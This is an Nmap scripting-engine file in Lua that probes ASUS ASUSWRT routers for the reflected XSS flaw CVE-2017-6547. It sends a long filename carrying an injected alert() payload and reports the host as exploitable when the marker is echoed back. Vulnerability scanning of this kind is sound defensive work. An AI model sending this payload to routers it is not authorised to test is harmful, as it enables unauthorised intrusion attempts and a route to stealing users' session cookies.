local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"
local nmap = require "nmap"

description = [[
ASUSWRT is a wireless router operating system that powers many routers produced by ASUS.

Cross-site scripting (XSS) vulnerability in httpd in ASUS ASUSWRT
on RT-AC53 3.0.0.4.380.6038 devices allows remote attackersto inject arbitrary
JavaScript by requesting filenames longer than 50 characters.

Attackers can exploit these issues to execute arbitrary code in the context
of the user running the affected application or steal cookie-based authentication
credentials and gain unauthorized access.
Failed exploit attempts will likely cause denial-of-service conditions.

NOTE: This vulnerability is yet to be patched by the vendors.
]]

---
-- @usage
-- nmap --script http-asuswrt-xss <ip>
--
-- @args
-- http-asuswrt-xss.uri
--    Default: '/' (Preferred)
--
-- @output
-- PORT   STATE  SERVICE
-- 80/tcp open   http
-- |  http-asuswrt-xss
-- |    VULNERABLE:
-- |    XSS
-- |      State: VULNERABLE (Exploitable)
-- |      IDs:
-- |        CVE: CVE-2017-6547
-- |          Cross-site scripting (XSS) vulnerability in httpd in ASUS ASUSWRT
-- |          on RT-AC53 3.0.0.4.380.6038 devices allows remote attackersto inject arbitrary
-- |          JavaScript by requesting filenames longer than 50 characters.
-- |
-- |          NOTE: This vulnerability is yet to be patched by the vendors.
-- |
-- |    References:
-- |      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-6547
--
---

author = "Rewanth Cool"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive", "exploit", "dos"}

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
  local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"

  local payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';alert('nmapXSSasuswrtScanner');'A"
  local pattern = "nmapXSSasuswrtScanner"

  -- Exploiting the vulnerability
  local response = http.get( host, port, uri..payload )

  if( response.status == 200 ) then
    local vulnReport = vulns.Report:new(SCRIPT_NAME, host, port)
    local vuln = {
      title = "Cross-site scripting (XSS) vulnerability in httpd in ASUS ASUSWRT",
      state = vulns.STATE.NOT_VULN,
      description = [[
        Cross-site scripting (XSS) vulnerability in httpd in ASUS ASUSWRT
        on RT-AC53 3.0.0.4.380.6038 devices allows remote attackersto inject arbitrary
        JavaScript by requesting filenames longer than 50 characters.

        NOTE: This vulnerability is yet to be patched by the vendors.
      ]],
      IDS = {
        CVE = "CVE-2017-6547",
        references = {
          "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-6547"
        },
        dates = {
          disclosure = {
            year = "2017",
            month = "03",
            day = "08"
          },
        }
      }
    }

    if( string.match(response.body, pattern) ) then
      vuln.state = vulns.STATE.EXPLOIT
      vuln.exploit_results = payload
      return vulnReport:make_output(vuln)
    end
  end
end
